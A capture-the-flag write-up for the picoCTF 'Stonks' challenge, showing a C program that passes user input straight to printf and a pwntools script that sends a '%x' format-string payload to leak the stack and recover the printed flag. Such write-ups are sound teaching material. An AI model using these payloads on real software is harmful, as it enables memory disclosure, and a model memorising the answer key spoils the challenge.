# Stonks

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Binary Exploitation  
**Points:** 20

# Challenge

## Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](./vuln.c) `nc mercury.picoctf.net 33411`

## Source

[vuln.c](./vuln.c) (C source)

# Solution

In this challenge, we are given a [C source file](./vuln.c) that has a vulnerability. Looking at the code, we see this part:

```c
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

The program asks for a user input, and then prints it using printf. This is vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack). Leveraging this vulnerability, we can print out values from the stack. Let's do it with [this python script](./script.py) using the [pwntools](https://docs.pwntools.com/en/stable/) library:

```python
from pwn import *

# Establish connection
conn = remote('mercury.picoctf.net', 33411)

# Route to the exploit
conn.recvuntil('2) View my portfolio\n')
conn.send('1\n')
conn.recvuntil('What is your API token?\n')

# Exploit
conn.send('%x' + '.%x' * 40 + '\n')

# Route to the leak
conn.recvuntil('Buying stonks with token:\n')
# Get the data
stack = conn.recvline(False).decode()

# Parse the data
result = b''
for h in stack.split('.'):
    result += p32(int(h, 16))

# Extract the flag
flag = result[result.find(b'picoCTF{'):result.find(b'}') + 1].decode()

# Print the flag
print(flag)
```

**The Flag:** `picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}`
